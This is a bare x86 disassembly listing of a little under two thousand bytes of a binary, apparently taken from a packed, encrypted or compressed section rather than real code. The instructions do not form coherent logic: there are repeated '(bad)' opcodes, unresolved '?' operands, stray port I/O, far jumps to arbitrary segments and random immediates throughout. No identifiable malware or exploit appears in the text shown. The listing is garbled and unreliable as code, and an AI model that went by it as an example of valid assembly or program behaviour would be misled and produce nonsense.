  409cc9:	cld    
  409cca:	or     DWORD PTR [ecx],ebx
  409ccc:	and    cl,BYTE PTR [eax]
  409cce:	test   BYTE PTR [eax-0x586e768],dh
  409cd4:	pop    ds
  409cd5:	gs jae 0x409c66
  409cd8:	clc    
  409cd9:	enter  0xaac3,0x1
  409cdd:	jge    0x409c9f
  409cdf:	in     al,dx
  409ce0:	shl    BYTE PTR [ecx-0x6ec49129],cl
  409ce6:	jecxz  0x409d1f
  409ce8:	ret    
  409ce9:	outs   dx,DWORD PTR ds:[esi]
  409cea:	mov    ch,0x87
  409cec:	lods   al,BYTE PTR ds:[esi]
  409ced:	in     al,0x89
  409cef:	mov    cs,WORD PTR [eax+0x38a84a21]
  409cf5:	inc    esp
  409cf6:	dec    ecx
  409cf7:	fisub  WORD PTR [ebx]
  409cf9:	popa   
  409cfa:	test   BYTE PTR [edx+0x69],dl
  409cfd:	imul   esi,DWORD PTR [edx+eax*8],0x60bea3b4
  409d04:	inc    ebp
  409d05:	jl     0x409d11
  409d07:	mov    ?,WORD PTR [ecx]
  409d09:	jbe    0x409c91
  409d0b:	fbstp  TBYTE PTR [esi]
  409d0d:	dec    ebx
  409d0e:	xchg   esp,ebx
  409d10:	mov    BYTE PTR [esi],bh
  409d12:	pop    ecx
  409d13:	je     0x409ce7
  409d15:	loop   0x409cdf
  409d17:	and    al,0xd0
  409d19:	loopne 0x409d2c
  409d1b:	dec    esp
  409d1c:	dec    eax
  409d1d:	pop    ds
  409d1e:	popa   
  409d1f:	push   es
  409d20:	mov    esi,0xd4d2552d
  409d25:	jne    0x409d91
  409d27:	imul   ebp,DWORD PTR [si],0x976dbd64
  409d2e:	adc    DWORD PTR [esi],esp
  409d30:	int3   
  409d31:	or     bh,BYTE PTR [ecx*4-0x1a7a9a8d]
  409d38:	sub    edi,DWORD PTR [eax]
  409d3a:	sub    DWORD PTR ds:0x37df2ad2,ebp
  409d40:	ins    DWORD PTR es:[edi],dx
  409d41:	call   0xd16a:0x11265722
  409d48:	das    
  409d49:	push   edi
  409d4a:	dec    esi
  409d4b:	cmp    al,0xd9
  409d4d:	out    dx,al
  409d4e:	test   esi,esi
  409d50:	or     al,0x2a
  409d52:	in     al,0x47
  409d54:	jl     0x409cdc
  409d56:	push   edi
  409d57:	xchg   ebx,eax
  409d58:	adc    al,0x1d
  409d5a:	or     esp,DWORD PTR [edx]
  409d5c:	sub    ah,ch
  409d5e:	and    eax,0x8514f6b6
  409d63:	pop    es
  409d64:	out    0x10,eax
  409d66:	cmp    al,0x5c
  409d68:	cwde   
  409d69:	push   esp
  409d6a:	data16 cmp BYTE PTR ds:[esi+0x1a],cl
  409d6f:	mov    WORD PTR ds:0x65f3690a,gs
  409d75:	jae    0x409d7b
  409d77:	pop    es
  409d78:	enter  0xee51,0xad
  409d7c:	rol    DWORD PTR [ecx-0xfaf606],cl
  409d82:	xor    esi,DWORD PTR [esi-0x5464a856]
  409d88:	lds    esi,FWORD PTR [eax+0x4]
  409d8b:	scas   eax,DWORD PTR es:[edi]
  409d8c:	dec    ebp
  409d8d:	rol    DWORD PTR [edi],cl
  409d8f:	dec    edi
  409d90:	mov    ah,0x9d
  409d92:	test   ecx,ebp
  409d94:	(bad)  
  409d95:	or     dh,BYTE PTR [eax+eiz*1-0x28]
  409d99:	je     0x409d59
  409d9b:	xchg   BYTE PTR [esi+0x19],cl
  409d9e:	cmp    eax,0x846a7469
  409da3:	mov    cl,0xa
  409da5:	xor    edi,DWORD PTR [eax]
  409da7:	xor    al,0x4c
  409da9:	jo     0x409df2
  409dab:	mov    es,WORD PTR [eax-0x5e011e0a]
  409db1:	pop    ebx
  409db2:	jo     0x409dc3
  409db4:	ror    BYTE PTR [esp+eiz*4],cl
  409db7:	inc    esi
  409db8:	cwde   
  409db9:	repnz stos BYTE PTR es:[edi],al
  409dbb:	mov    eax,0xf7441101
  409dc0:	out    0x32,al
  409dc2:	lods   al,BYTE PTR ds:[esi]
  409dc3:	int3   
  409dc4:	adc    eax,0x4986847a
  409dc9:	mov    edi,0xbbd1271e
  409dce:	adc    BYTE PTR [esi-0x638c2355],cl
  409dd4:	cmp    ebx,eax
  409dd6:	push   es
  409dd7:	or     BYTE PTR [esi-0x6a67a0d],bh
  409ddd:	fisttp QWORD PTR [ecx]
  409ddf:	ret    0xb36e
  409de2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409de3:	add    BYTE PTR fs:[edi+ecx*8],al
  409de7:	jae    0x409dd4
  409de9:	adc    DWORD PTR [esi-0x74d1d4c4],esp
  409def:	stos   DWORD PTR es:[edi],eax
  409df0:	ror    BYTE PTR [edx+eiz*4],cl
  409df3:	mov    ebp,0x5925339a
  409df8:	mov    WORD PTR [ecx],ss
  409dfa:	(bad)  [esp+esi*2+0x68]
  409dfe:	in     eax,0xf0
  409e00:	outs   dx,BYTE PTR ds:[esi]
  409e01:	mov    eax,ds:0x210c66fb
  409e06:	test   ebp,esi
  409e08:	add    DWORD PTR ss:[eax-0x1b],eax
  409e0c:	cmp    edx,DWORD PTR [ecx]
  409e0e:	mov    ah,0xd5
  409e10:	push   eax
  409e11:	xor    dl,ch
  409e13:	push   es
  409e14:	and    eax,0x5931844b
  409e19:	mov    eax,ds:0x1326ed7a
  409e1e:	lods   eax,DWORD PTR ds:[esi]
  409e1f:	mov    es,ebp
  409e21:	sti    
  409e22:	inc    edi
  409e23:	mov    cl,0x96
  409e25:	into   
  409e26:	mov    bh,0xa4
  409e28:	rcr    DWORD PTR [esp+edx*2+0x6b19923b],0x41
  409e30:	or     ah,al
  409e32:	popf   
  409e33:	mov    ss,WORD PTR [esi+edi*1-0x7a6da30d]
  409e3a:	xchg   edi,eax
  409e3b:	push   esp
  409e3c:	lods   eax,DWORD PTR ds:[esi]
  409e3d:	cmp    esp,DWORD PTR [ebx]
  409e3f:	or     edi,DWORD PTR [esi+0x31]
  409e42:	xchg   esi,esi
  409e44:	sbb    dl,bl
  409e46:	scas   eax,DWORD PTR es:[edi]
  409e47:	mov    fs,WORD PTR [edi+edx*8]
  409e4a:	xor    ebx,DWORD PTR [ecx+edx*2]
  409e4d:	sbb    eax,edx
  409e4f:	jle    0x409e8a
  409e51:	bound  eax,QWORD PTR [esi+eiz*4-0x4889645d]
  409e58:	inc    eax
  409e59:	and    DWORD PTR [edx-0x72],ebp
  409e5c:	dec    ebx
  409e5d:	push   ss
  409e5e:	or     dl,BYTE PTR [edx]
  409e60:	dec    ebp
  409e61:	inc    esi
  409e62:	arpl   di,bx
  409e64:	jmp    0xf11:0x7813b2df
  409e6b:	rcr    BYTE PTR [ecx+edx*1+0x7f],0x5
  409e70:	sub    dh,BYTE PTR [edx*8-0x4bccbd9b]
  409e77:	dec    edi
  409e78:	rcr    BYTE PTR [esi-0x674a18fa],cl
  409e7e:	adc    al,0x6a
  409e80:	adc    edx,DWORD PTR [ecx]
  409e82:	ret    0xe39a
  409e85:	in     eax,dx
  409e86:	pop    es
  409e87:	push   ebx
  409e88:	sbb    DWORD PTR [esi],0xffffff85
  409e8b:	test   DWORD PTR [ebx-0xf],0x3508b6ac
  409e92:	(bad)  
  409e93:	mov    cs,WORD PTR [ecx+edx*2]
  409e96:	jnp    0x409e7a
  409e98:	mov    ebp,0xd130b9e9
  409e9d:	adc    ebx,DWORD PTR [ebp+0x1d]
  409ea0:	cmc    
  409ea1:	mov    cl,0x91
  409ea3:	pop    ss
  409ea4:	push   esi
  409ea5:	push   ss
  409ea6:	clc    
  409ea7:	mov    ?,WORD PTR [esi+0x5b]
  409eaa:	dec    DWORD PTR [ebp+0x5dad681a]
  409eb0:	aad    0x4c
  409eb2:	xchg   BYTE PTR [ecx-0x7b],bl
  409eb5:	xchg   ecx,eax
  409eb6:	adc    DWORD PTR [edi-0x2b],ecx
  409eb9:	mov    ah,0x6a
  409ebb:	xchg   ebx,eax
  409ebc:	into   
  409ebd:	outs   dx,BYTE PTR ds:[esi]
  409ebe:	adc    edx,DWORD PTR [eax]
  409ec0:	out    0x4d,eax
  409ec2:	ins    BYTE PTR es:[edi],dx
  409ec3:	xchg   esi,eax
  409ec4:	ret    0x8580
  409ec7:	pop    ebp
  409ec8:	rcr    BYTE PTR [eax+0x46491f08],0xc1
  409ecf:	mov    ds,WORD PTR [edx+0x39e29452]
  409ed5:	scas   eax,DWORD PTR es:[edi]
  409ed6:	push   cs
  409ed7:	test   eax,0x8e6713e5
  409edc:	loope  0x409ef7
  409ede:	stos   DWORD PTR es:[edi],eax
  409edf:	(bad)  
  409ee0:	dec    eax
  409ee1:	ss mov ebx,0x69cf4c8e
  409ee7:	jecxz  0x409ea8
  409ee9:	jge    0x409f69
  409eeb:	inc    eax
  409eec:	(bad)  
  409eed:	mov    al,ds:0xfd52b30a
  409ef2:	lea    edi,[edi-0x5a4fa06a]
  409ef8:	jp     0x409e8d
  409efa:	add    eax,0x2d1a0671
  409eff:	repz inc ebp
  409f01:	add    BYTE PTR [ebp+0x4a66efe4],0x75
  409f08:	in     al,dx
  409f09:	repnz mov edi,0x75935597
  409f0f:	fucom  st(1)
  409f11:	enter  0x237c,0x26
  409f15:	adc    DWORD PTR [ecx+0x3f2b4d9c],ecx
  409f1b:	add    dl,dl
  409f1d:	sar    BYTE PTR [esp+ebp*4],0xdb
  409f21:	xchg   edi,eax
  409f22:	out    0xdc,al
  409f24:	ret    0xd911
  409f27:	jne    0x409f89
  409f29:	jg     0x409eea
  409f2b:	bound  esp,QWORD PTR [eax]
  409f2d:	inc    ebx
  409f2e:	test   bl,bl
  409f30:	pop    edx
  409f31:	fwait
  409f32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f33:	aad    0x9e
  409f35:	mov    esp,DWORD PTR [esi-0x4f768c61]
  409f3b:	retf   0x61d2
  409f3e:	scas   al,BYTE PTR es:[edi]
  409f3f:	loopne 0x409f24
  409f41:	mov    ebp,0xe73bdc85
  409f46:	lods   eax,DWORD PTR ds:[esi]
  409f47:	add    BYTE PTR [eax+esi*1-0x4091718d],ch
  409f4e:	stos   BYTE PTR es:[edi],al
  409f4f:	adc    ah,BYTE PTR [eax+ebp*4-0x7ed9a94e]
  409f56:	test   DWORD PTR ds:0x3df12d28,esp
  409f5c:	rcl    DWORD PTR [ebp-0x781767f5],1
  409f62:	cmp    esi,DWORD PTR [eax]
  409f64:	dec    edx
  409f65:	cwde   
  409f66:	ret    0xd252
  409f69:	shl    BYTE PTR [edi-0x28f441e3],1
  409f6f:	test   al,0x7e
  409f71:	scas   al,BYTE PTR es:[edi]
  409f72:	loopne 0x409f02
  409f74:	adc    ch,BYTE PTR [ecx+eax*2]
  409f77:	pop    ds
  409f78:	push   0x1a8a2c90
  409f7d:	xor    eax,0x78c38e2a
  409f82:	out    dx,eax
  409f83:	neg    DWORD PTR [ebx]
  409f85:	sub    eax,0xe66c9e34
  409f8a:	mov    ecx,0x4801ed80
  409f8f:	dec    esp
  409f90:	mov    dl,0x59
  409f92:	ret    
  409f93:	cmp    dl,dl
  409f95:	pop    eax
  409f96:	xor    al,0x61
  409f98:	shl    edi,0xf6
  409f9b:	enter  0x149c,0x88
  409f9f:	inc    esp
  409fa0:	fwait
  409fa1:	inc    esi
  409fa2:	or     DWORD PTR [esi],ecx
  409fa4:	fld    QWORD PTR [edx]
  409fa6:	xchg   edx,eax
  409fa7:	iret   
  409fa8:	(bad)
  409fac:	lds    edi,FWORD PTR [esp+ebp*8+0x47]
  409fb0:	mov    ah,BYTE PTR [eax+0x5a]
  409fb3:	out    0xe,al
  409fb5:	jbe    0x409ff3
  409fb7:	mov    WORD PTR [ecx+0x6294db6d],ss
  409fbd:	les    esi,FWORD PTR [eax]
  409fbf:	mov    ebp,0x3585f7b5
  409fc4:	xchg   esi,eax
  409fc5:	lods   al,BYTE PTR ds:[esi]
  409fc6:	scas   eax,DWORD PTR es:[edi]
  409fc7:	(bad)  
  409fc8:	outs   dx,BYTE PTR ds:[esi]
  409fc9:	mov    ecx,0x99f88a42
  409fce:	and    ebp,ecx
  409fd0:	cld    
  409fd1:	daa    
  409fd2:	mov    DWORD PTR [ecx],ecx
  409fd4:	(bad)  
  409fd5:	push   ecx
  409fd6:	jne    0x409fee
  409fd8:	shl    BYTE PTR [eax-0x7b],cl
  409fdb:	pop    ebx
  409fdc:	mov    cl,bl
  409fde:	(bad)  
  409fdf:	lods   eax,DWORD PTR ds:[esi]
  409fe0:	das    
  409fe1:	fs ret 0xeee2
  409fe5:	adc    DWORD PTR [ebx-0x384305e4],ebp
  409feb:	or     ebx,DWORD PTR [ecx]
  409fed:	stc    
  409fee:	test   DWORD PTR [edx+0x24],ecx
  409ff1:	inc    ebx
  409ff2:	gs sahf 
  409ff4:	and    dl,BYTE PTR [esi-0x2]
  409ff7:	mov    ?,WORD PTR [ecx+0x41]
  409ffa:	dec    esi
  409ffb:	mov    ecx,0x816d4d60
  40a000:	sar    BYTE PTR [edx+0x5d1c1f48],cl
  40a006:	xchg   esi,eax
  40a007:	xor    al,0xb4
  40a009:	adc    DWORD PTR [edi+ecx*4-0x38],esi
  40a00d:	jns    0x40a080
  40a00f:	inc    esi
  40a010:	add    al,0x21
  40a012:	test   DWORD PTR [ebx],ecx
  40a014:	scas   eax,DWORD PTR es:[edi]
  40a015:	pop    es
  40a016:	jmp    0x608e:0x1de44b9f
  40a01d:	mov    bl,0x39
  40a01f:	aad    0x4a
  40a021:	rcr    DWORD PTR [ebp-0x4cbb2d5e],cl
  40a027:	neg    BYTE PTR [ebx+0x4f]
  40a02a:	jnp    0x409fe3
  40a02c:	and    BYTE PTR [ecx],dl
  40a02e:	rcr    DWORD PTR [edi-0x1f1fd1c6],cl
  40a034:	inc    edx
  40a035:	mov    ds:0x4cd25763,eax
  40a03a:	(bad)  [ebp-0x32]
  40a03d:	aaa    
  40a03e:	adc    BYTE PTR [eax-0x71f987ac],0xca
  40a045:	cld    
  40a046:	fdiv   st(3),st
  40a048:	jbe    0x40a09c
  40a04a:	and    esi,ebx
  40a04c:	shr    BYTE PTR [ecx+0x3],cl
  40a04f:	push   cs
  40a050:	inc    esp
  40a051:	(bad)  
  40a052:	aam    0x9
  40a054:	enter  0x9d11,0x6c
  40a058:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a059:	jle    0x40a080
  40a05b:	repnz iret 
  40a05d:	loope  0x409fe4
  40a05f:	cmp    eax,0x41ac7b2c
  40a064:	icebp  
  40a065:	inc    ecx
  40a066:	ficom  DWORD PTR [edi+0x32b40f04]
  40a06c:	imul   BYTE PTR [esi+0x5d06798a]
  40a072:	adc    BYTE PTR [edx-0x53],bl
  40a075:	gs add al,0x51
  40a078:	or     DWORD PTR [edx+0x2fbe2602],0xffffffc5
  40a07f:	mov    ds,WORD PTR [esi-0x23]
  40a082:	sbb    al,bh
  40a084:	xlat   BYTE PTR ds:[ebx]
  40a085:	out    0x18,al
  40a087:	sub    BYTE PTR [edx],cl
  40a089:	mov    esp,0xcd69388
  40a08e:	test   eax,0x1cbe9f4c
  40a093:	mov    cl,BYTE PTR [edx-0x17716fd5]
  40a099:	push   ebp
  40a09a:	stos   BYTE PTR es:[edi],al
  40a09b:	fs stos BYTE PTR es:[edi],al
  40a09d:	sbb    al,0x56
  40a09f:	repz rcl BYTE PTR [ebx+0x2cc40108],cl
  40a0a6:	mov    al,ds:0x241139d0
  40a0ab:	sub    BYTE PTR [ebx+0x82531f3],0xe5
  40a0b2:	test   DWORD PTR [ebp-0x2dedb938],esp
  40a0b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0b9:	fs add eax,0xfdae6206
  40a0bf:	mov    ?,WORD PTR [ebp*8+0x571d4f69]
  40a0c6:	nop
  40a0c7:	call   0x8970:0x8c2e3ad3
  40a0ce:	cmp    DWORD PTR [edi],edx
  40a0d0:	repnz ds mov al,0x8e
  40a0d4:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40a0d6:	push   esi
  40a0d7:	pop    ebx
  40a0d8:	lea    ebx,[edi+0x24]
  40a0db:	out    0xd2,eax
  40a0dd:	jmp    0x8918:0xc3ea12a7
  40a0e4:	loope  0x40a087
  40a0e6:	je     0x40a06f
  40a0e8:	loopne 0x40a08c
  40a0ea:	ror    DWORD PTR [esi-0x69b0cec8],0xb1
  40a0f1:	mov    WORD PTR [eax+0x15c38705],cs
  40a0f7:	fwait
  40a0f8:	sar    BYTE PTR [eax-0x66501c8a],1
  40a0fe:	inc    ebp
  40a0ff:	cmp    dl,BYTE PTR [ebx+0x2]
  40a102:	fwait
  40a103:	adc    eax,DWORD PTR [ebx-0x62]
  40a106:	sbb    ebp,DWORD PTR [edi-0x2b6c5e12]
  40a10c:	sar    bl,cl
  40a10e:	jle    0x40a18d
  40a110:	aam    0xa2
  40a112:	test   al,0x5d
  40a114:	mov    ebp,0x61b0c402
  40a119:	push   ds
  40a11a:	xchg   esi,eax
  40a11b:	cli    
  40a11c:	adc    DWORD PTR [esi],ebp
  40a11e:	cwde   
  40a11f:	in     eax,0xd2
  40a121:	xchg   esi,eax
  40a122:	mov    ds:0xcde09fea,al
  40a127:	test   DWORD PTR ds:0xac618411,0xdb43351b
  40a131:	jp     0x40a0b7
  40a133:	xor    edx,DWORD PTR [edx+0x292c0daa]
  40a139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a13a:	cmp    al,0x8d
  40a13c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a13d:	icebp  
  40a13e:	(bad)  
  40a13f:	mov    al,ds:0x73dd67d4
  40a144:	(bad)  
  40a145:	cmc    
  40a146:	dec    ebp
  40a147:	or     DWORD PTR [ebx],edx
  40a149:	aas    
  40a14a:	lock add ah,BYTE PTR [ecx]
  40a14d:	cwde   
  40a14e:	in     eax,0x36
  40a150:	inc    ebx
  40a151:	push   ds
  40a152:	cmp    BYTE PTR [edi],dh
  40a154:	aam    0x16
  40a156:	into   
  40a157:	loop   0x40a0e2
  40a159:	das    
  40a15a:	test   DWORD PTR [ebp-0x37],ecx
  40a15d:	lock hlt 
  40a15f:	retf   
  40a160:	jecxz  0x40a19a
  40a162:	dec    eax
  40a163:	mov    ?,WORD PTR [edx+0x55]
  40a166:	add    BYTE PTR [ecx+0x63ba5d1],0xd3
  40a16d:	or     dh,0xa4
  40a170:	cmp    eax,0x8ea22761
  40a175:	test   BYTE PTR [edi-0x72],dh
  40a178:	mov    edi,0x402d45d
  40a17d:	adc    al,0x62
  40a17f:	or     al,0xd2
  40a181:	inc    esi
  40a182:	push   esi
  40a183:	xchg   ebp,eax
  40a184:	jne    0x40a1c6
  40a186:	ds push ebp
  40a188:	xchg   edi,eax
  40a189:	adc    ebx,esp
  40a18b:	call   0x5d5d:0xc1ecb37a
  40a192:	call   DWORD PTR [esi+0x6e8f6f19]
  40a198:	pop    esi
  40a199:	repnz cmp BYTE PTR [edx],ah
  40a19c:	jmp    0xdd39:0x46cca411
  40a1a3:	and    ebp,ebx
  40a1a5:	cmp    esp,0xb0dab3da
  40a1ab:	scas   al,BYTE PTR es:[edi]
  40a1ac:	inc    edi
  40a1ad:	int3   
  40a1ae:	sub    BYTE PTR cs:0x2bfbfc11,bl
  40a1b5:	dec    edx
  40a1b6:	add    dl,0xae
  40a1b9:	call   0xaef2:0xc5b92f85
  40a1c0:	call   0x1fcea508
  40a1c5:	ins    DWORD PTR es:[edi],dx
  40a1c6:	pop    ecx
  40a1c7:	xor    BYTE PTR [esi],ch
  40a1c9:	mov    al,0x53
  40a1cb:	int3   
  40a1cc:	sar    BYTE PTR [edi],cl
  40a1ce:	xchg   ebp,eax
  40a1cf:	call   0xf7b0e660
  40a1d4:	jmp    0xa8cf6246
  40a1d9:	sub    ebp,DWORD PTR [edi]
  40a1db:	add    eax,0x2826e58f
  40a1e0:	cmp    al,0x3
  40a1e2:	test   DWORD PTR [edi+esi*8+0x195363a3],esi
  40a1e9:	jno    0x40a20a
  40a1eb:	xchg   ebx,eax
  40a1ec:	jecxz  0x40a194
  40a1ee:	lock xor eax,DWORD PTR [ecx+0x5f8a1454]
  40a1f5:	arpl   si,dx
  40a1f7:	xchg   edx,edx
  40a1f9:	lea    ebx,[edx]
  40a1fb:	pop    edx
  40a1fc:	fist   DWORD PTR [edi+0x2a]
  40a1ff:	lods   al,BYTE PTR ds:[esi]
  40a200:	mov    ebx,0x125f0911
  40a205:	mov    ebp,0x4bcb74bb
  40a20a:	test   BYTE PTR [edi+0x21d0b102],ch
  40a210:	ret    
  40a211:	inc    ecx
  40a212:	and    eax,0x3d496c8e
  40a217:	js     0x40a1ff
  40a219:	test   eax,0xe0d215c0
  40a21e:	jp     0x40a202
  40a220:	mov    bl,BYTE PTR [ebx+0x10ec8066]
  40a226:	in     al,0xd0
  40a228:	xchg   esp,eax
  40a229:	inc    ecx
  40a22a:	daa    
  40a22b:	pop    ss
  40a22c:	xchg   ebx,eax
  40a22d:	xlat   BYTE PTR ds:[ebx]
  40a22e:	iret   
  40a22f:	loop   0x40a29a
  40a231:	add    eax,0xa8137485
  40a236:	or     eax,0xa9e65c64
  40a23b:	mov    ?,WORD PTR [esi]
  40a23d:	inc    edi
  40a23e:	push   es
  40a23f:	cmp    BYTE PTR cs:[ebp+0xd4a4e79],bh
  40a246:	mov    dh,BYTE PTR [ecx]
  40a248:	inc    ecx
  40a249:	push   edi
  40a24a:	mov    eax,0x410eed0b
  40a24f:	test   eax,0xf65c11c6
  40a254:	ja     0x40a2ce
  40a256:	fnstenv [esi+0x8]
  40a259:	sub    eax,DWORD PTR [ebp-0x2bbab3eb]
  40a25f:	in     eax,dx
  40a260:	lods   al,BYTE PTR ds:[esi]
  40a261:	cmp    eax,0x11c86860
  40a266:	jecxz  0x40a210
  40a268:	scas   al,BYTE PTR es:[edi]
  40a269:	test   eax,0x618eb921
  40a26e:	test   cl,bl
  40a270:	aad    0xa8
  40a272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a273:	sahf   
  40a274:	and    al,0x2c
  40a276:	lea    edi,cs:[ebx]
  40a279:	dec    edx
  40a27a:	call   0xd2b0:0xc354c3f9
  40a281:	push   edi
  40a282:	lahf   
  40a283:	clc    
  40a284:	dec    ecx
  40a285:	shr    DWORD PTR [ecx+0x0],1
  40a288:	or     al,0x11
  40a28a:	mov    dl,0x3b
  40a28c:	fwait
  40a28d:	add    eax,0xbaf6edaa
  40a292:	(bad)  
  40a293:	in     eax,0xd1
  40a295:	imul   edi,DWORD PTR [esi-0x3bbb9cb7],0x2f
  40a29c:	call   0xc34120d8
  40a2a1:	pop    ss
  40a2a2:	jae    0x40a2a1
  40a2a4:	cs stos BYTE PTR es:[edi],al
  40a2a6:	jmp    0xe2de:0x6999343d
  40a2ad:	mov    dh,0x49
  40a2af:	sar    BYTE PTR [edx+ecx*1],cl
  40a2b2:	(bad)  
  40a2b3:	mov    edi,0xfb151e75
  40a2b8:	pushf  
  40a2b9:	call   0x15bd:0x11a9dd5c
  40a2c0:	sub    dh,BYTE PTR [ecx-0x689b4c]
  40a2c6:	mov    dl,al
  40a2c8:	adc    ecx,eax
  40a2ca:	push   0x8
  40a2cc:	and    ah,BYTE PTR [ecx+0x11b7527e]
  40a2d2:	hlt    
  40a2d3:	shl    BYTE PTR [ebx],cl
  40a2d5:	in     eax,dx
  40a2d6:	test   al,0x92
  40a2d8:	repz js 0x40a25f
  40a2db:	sbb    al,0x0
  40a2dd:	je     0x40a295
  40a2df:	into   
  40a2e0:	xchg   DWORD PTR [ebx+ecx*2],ebp
  40a2e3:	mov    gs,WORD PTR [ecx+0x58]
  40a2e6:	mov    edx,0xe09849a4
  40a2eb:	je     0x40a29a
  40a2ed:	push   esp
  40a2ee:	mov    WORD PTR [edi-0x6d],fs
  40a2f1:	pop    eax
  40a2f2:	push   esi
  40a2f3:	xchg   edi,eax
  40a2f4:	(bad)  
  40a2f5:	jge    0x40a2bf
  40a2f7:	jb     0x40a360
  40a2f9:	mov    esi,0xe48fb96a
  40a2fe:	cld    
  40a2ff:	mov    eax,ds:0xea1f8fc
  40a304:	jl     0x40a2f0
  40a306:	pop    edi
  40a307:	arpl   WORD PTR ds:0x52372111,bx
  40a30d:	sub    al,0xd5
  40a30f:	xor    ebx,ecx
  40a311:	jnp    0x40a297
  40a313:	pop    ebx
  40a314:	xchg   edi,eax
  40a315:	sub    al,0x55
  40a317:	lea    esp,[ecx-0x68]
  40a31a:	ror    BYTE PTR [esi-0x64ef806],1
  40a320:	sub    ecx,DWORD PTR [ebx+0x6d260fb]
  40a326:	xor    ebp,eax
  40a328:	cmp    edi,ecx
  40a32a:	imul   esi,DWORD PTR ds:0x8d337feb,0x6a
  40a331:	push   esi
  40a332:	mov    WORD PTR [edx+0x14721e24],gs
  40a338:	rcl    BYTE PTR [edx-0x5b],cl
  40a33b:	mov    al,0xd7
  40a33d:	inc    edi
  40a33e:	stos   BYTE PTR es:[edi],al
  40a33f:	xor    al,0xc1
  40a341:	adc    al,0xbc
  40a343:	push   ebp
  40a344:	push   0xa21d844e
  40a349:	fxch   st(0)
  40a34b:	call   edx
  40a34d:	xor    BYTE PTR ds:0x8aa33991,bh
  40a353:	cdq    
  40a354:	cmp    dl,BYTE PTR [eax]
  40a356:	neg    BYTE PTR [ebp+0x5b865031]
  40a35c:	inc    edx
  40a35d:	cmp    eax,0x56c6f777
  40a362:	loope  0x40a3ba
  40a364:	adc    cl,dh
  40a366:	stc    
  40a367:	sar    BYTE PTR [ebx+0x738ea10a],1
  40a36d:	imul   esp,esp,0x2b72e440
  40a373:	mov    cl,0xa0
  40a375:	test   BYTE PTR [ebp-0x4657bf52],0xe
  40a37c:	jecxz  0x40a321
  40a37e:	ss scas eax,DWORD PTR es:[edi]
  40a380:	jb     0x40a3d2
  40a382:	out    dx,eax
  40a383:	std    
  40a384:	aaa    
  40a385:	bound  eax,QWORD PTR [edi+eiz*1+0x7525675b]
  40a38c:	sub    BYTE PTR [ebp+0x628cf885],0xdb
  40a393:	loopne 0x40a316
  40a395:	pop    ebp
  40a396:	pop    edi
  40a397:	mov    WORD PTR [esi-0x62],ds
  40a39a:	inc    DWORD PTR [eax-0xd3a0360]
  40a3a0:	pop    ecx
  40a3a1:	neg    BYTE PTR [ebp-0x6d]
  40a3a4:	rcl    BYTE PTR [ecx-0x45],cl
  40a3a7:	and    DWORD PTR [edx],esp
  40a3a9:	xchg   BYTE PTR [edi],ah
  40a3ab:	xchg   BYTE PTR [esi+0x64bfc414],dh
  40a3b1:	dec    BYTE PTR [edi+edx*2-0x5130b157]
  40a3b8:	or     cl,BYTE PTR [edi+0x5fad6996]
  40a3be:	add    ebp,DWORD PTR [eax+0x3e]
  40a3c1:	das    
  40a3c2:	in     eax,0xbe
  40a3c4:	mov    cl,0xf2
  40a3c6:	cmp    DWORD PTR [edi+0x3bcd139b],ebx
  40a3cc:	xor    bh,ah
  40a3ce:	imul   esi,DWORD PTR [edx+0x72],0x5
  40a3d2:	test   esp,ecx
  40a3d4:	ja     0x40a39b
  40a3d6:	pop    ss
  40a3d7:	(bad)  
  40a3d8:	scas   eax,DWORD PTR es:[edi]
  40a3d9:	shl    BYTE PTR [esi+ecx*4-0xf],cl
  40a3dd:	push   edx
  40a3de:	pop    esi
  40a3df:	push   0xc4273aa4
  40a3e4:	(bad)  
  40a3e5:	stos   BYTE PTR es:[edi],al
  40a3e6:	pop    ebx
  40a3e7:	enter  0xd3e9,0xd9
  40a3eb:	out    dx,al
  40a3ec:	fstp   QWORD PTR [ecx-0x7462211e]
  40a3f2:	arpl   WORD PTR [esi],di
  40a3f4:	cli    
  40a3f5:	push   edi
  40a3f6:	data16 mov ss,WORD PTR [ebx+0x57]
  40a3fa:	push   ds
  40a3fb:	ror    bl,cl
  40a3fd:	mov    ebp,0x26d234c8
  40a402:	jmp    0x8eefdeed
  40a407:	(bad)  
  40a408:	test   eax,0xaf0e481e
  40a40d:	pop    eax
  40a40e:	scas   eax,DWORD PTR es:[edi]
  40a40f:	or     cl,BYTE PTR [edi]
  40a411:	ins    DWORD PTR es:[edi],dx
  40a412:	inc    ecx
  40a413:	jb     0x40a3e7
  40a415:	shr    BYTE PTR [edi-0x44],cl
  40a418:	push   es
  40a419:	and    edi,DWORD PTR [ebp-0x75ee3017]
  40a41f:	pop    ds
  40a420:	add    edi,0x38
  40a423:	int    0x62
  40a425:	pop    ss
  40a426:	test   DWORD PTR [esi-0x5f],eax
  40a429:	lods   al,BYTE PTR ds:[esi]
  40a42a:	retf   
  40a42b:	das    
  40a42c:	lea    esi,[esi]
  40a42e:	pop    ss
  40a42f:	mov    gs,WORD PTR [ebp+0x13]
  40a432:	xor    esi,esi
  40a434:	pop    esp
  40a435:	sbb    bl,BYTE PTR [ecx]
  40a437:	cmp    dl,dl
  40a439:	xchg   DWORD PTR [ebx],esp
  40a43b:	push   ecx
  40a43c:	out    dx,al
  40a43d:	add    BYTE PTR [edi],0x7a
  40a440:	jle    0x40a401
  40a442:	outs   dx,DWORD PTR ds:[esi]
  40a443:	into   
  40a444:	and    ah,BYTE PTR [ebp+ebp*2-0x1e]
  40a448:	sub    dh,BYTE PTR [edi]
  40a44a:	stos   DWORD PTR es:[edi],eax
  40a44b:	(bad)  
  40a44c:	popa   
  40a44d:	push   ds
  40a44e:	out    dx,eax
  40a44f:	push   edi
  40a450:	test   al,0xe2
  40a452:	lea    eax,[edx+edx*8-0x418a2973]
  40a459:	js     0x40a4c9
  40a45b:	or     cl,BYTE PTR [esi+ebx*1+0x58]
  40a45f:	xor    dl,dh
  40a461:	mov    eax,0x70097be
  40a466:	int    0xa9
  40a468:	shl    bh,cl
  40a46a:	lahf   
  40a46b:	in     eax,dx
  40a46c:	add    eax,esi
